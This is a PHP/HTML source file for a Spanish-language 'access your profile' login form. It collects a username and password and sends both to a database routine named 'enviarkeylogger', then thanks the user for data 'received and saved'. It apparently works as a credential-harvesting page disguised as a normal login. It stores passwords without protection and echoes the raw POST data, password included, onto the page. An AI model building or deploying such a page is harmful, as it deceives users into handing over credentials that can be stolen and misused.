<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Document</title>
        <link rel="stylesheet" href="../assets/styles.css" />
    </head>
    <?php



include "../classes/class.forms.php";
include "../classes/class.db.php";

$InputCeina =new CeinaForms();
$enviarkeylogger = new DBforms();

if($_SERVER["REQUEST_METHOD"] === "POST"){
     var_dump($_POST);
  $InputCeina->enviarFormulario($_POST);
}
$existeValidacion = !empty($InputCeina) && $_SERVER["REQUEST_METHOD"] === "POST" ? true : false; 

?>
    <body>
        <main>
      
<div class="container-box">
<div class="formulario-registro-cliente">
<h2>ACCEDE A TU PERFIL.</h2>
   <form 
     action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" 
     method="post"
     
>

<?php   

//INPUTS TEXT
     $InputCeina ->showInput(
     $type = "text",
     $id = "nombre",
     $name = "nombre",
     $placeholder = "Pon aquí tu nombre de Usuario",
     $label = "Nombre de Usuario",
     $validacion = $existeValidacion);
//--
     $InputCeina ->showInput(
     $type = "password",
     $id = "contrasena",
     $name = "contrasena",
     $placeholder = "Pon aquí tu Contraseña",
     $label = "Contraseña",
     $validacion = $existeValidacion);

?>
<button type="submit" class="submit">Enviar</button>
<?php

$errores = $InputCeina->hayErrores();
if (!$errores && $existeValidacion) {
    
    // Enviar a la base de datos
    $idkeylogger = $enviarkeylogger->enviarkeylogger(
        'ss',
        $InputCeina->datosRecibidos['nombre'],
        $InputCeina->datosRecibidos['contrasena']
    );
    if (!empty($idkeylogger)) {
        echo '<p>Gracias, hemos recibido y guardado sus datos</p>';
    }
}else{
        echo '<p>NADA</p>';
    };
    
?>
</form>
</div>
</div>

</main>
</body>
</html>
